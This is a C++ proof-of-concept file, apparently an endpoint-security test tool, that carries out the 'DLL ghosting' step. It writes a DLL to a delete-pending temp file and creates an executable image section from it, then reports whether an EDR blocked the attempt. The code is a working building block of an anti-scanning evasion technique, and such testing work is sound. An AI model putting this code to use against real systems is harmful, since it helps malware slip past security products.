#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <string>

// Advanced EDR Test Tool: DLL Ghosting PoC
// This tool attempts to bypass traditional file-on-disk scanning 
// by creating a section from a file marked for deletion.

typedef NTSTATUS(NTAPI* pNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
);

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Usage: ghost_poc.exe <source_dll_path>" << std::endl;
        return 1;
    }

    const char* sourcePath = argv[1];
    const char* ghostPath = "C:\\Windows\\Temp\\ghost_test.dll";

    std::cout << "[*] Initiating Ghosting attack simulation..." << std::endl;

    // 1. Create file with delete-on-close
    HANDLE hFile = CreateFileA(ghostPath, 
        GENERIC_READ | GENERIC_WRITE | DELETE, 
        FILE_SHARE_READ | FILE_SHARE_WRITE, 
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to create target file. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // 2. Prepare payload (Copy source DLL to ghost file)
    HANDLE hSrc = CreateFileA(sourcePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to open source DLL." << std::endl;
        CloseHandle(hFile);
        return 1;
    }

    DWORD size = GetFileSize(hSrc, NULL);
    void* buffer = malloc(size);
    DWORD read;
    ReadFile(hSrc, buffer, size, &read, NULL);
    WriteFile(hFile, buffer, size, &read, NULL);
    free(buffer);
    CloseHandle(hSrc);

    // 3. Mark for deletion (race condition setup)
    FILE_DISPOSITION_INFO fdi = { TRUE };
    SetFileInformationByHandle(hFile, FileDispositionInfo, &fdi, sizeof(fdi));

    // 4. Trigger EDR Interception: Create executable section from the "ghost" file
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNt, "NtCreateSection");

    HANDLE hSection = NULL;
    // SEC_IMAGE = 0x1000000
    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_EXECUTE_READ, 0x1000000, hFile);

    if (status == 0) {
        std::cout << "[-] FAILURE: EDR failed to intercept Ghosting attempt. Section created." << std::endl;
        CloseHandle(hSection);
    } else if (status == 0xC0000022) { // STATUS_ACCESS_DENIED
        std::cout << "[+] SUCCESS: EDR intercepted and blocked DLL Ghosting (STATUS_ACCESS_DENIED)!" << std::endl;
    } else {
        std::cout << "[*] NtCreateSection returned unexpected status: 0x" << std::hex << status << std::endl;
    }

    CloseHandle(hFile);
    return 0;
}
